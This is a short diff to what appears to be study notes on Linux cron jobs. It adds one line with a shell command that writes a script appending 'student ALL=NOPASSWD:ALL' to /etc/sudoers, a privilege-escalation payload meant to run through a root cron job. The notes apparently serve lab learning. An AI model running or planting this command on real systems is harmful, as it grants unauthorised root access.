@@ -48,4 +48,5 @@ EG: - Use for taking backups regularly
 >sudo u
 >crontab -l
 
+### printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
    
